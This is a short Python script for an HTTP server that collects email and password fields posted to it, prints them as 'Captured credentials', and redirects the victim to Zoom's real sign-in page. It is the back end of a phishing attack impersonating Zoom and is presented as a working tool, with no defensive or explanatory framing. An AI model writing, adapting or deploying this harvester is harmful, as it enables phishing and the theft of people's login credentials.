from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length).decode()
        print(f'\n[+] Raw data: {raw}')
        data = parse_qs(raw)
        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]
        print(f'[+] Captured credentials!')
        print(f'    Email:    {email}')
        print(f'    Password: {password}\n')
        self.send_response(302)
        self.send_header('Location', 'https://zoom.us/signin')
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
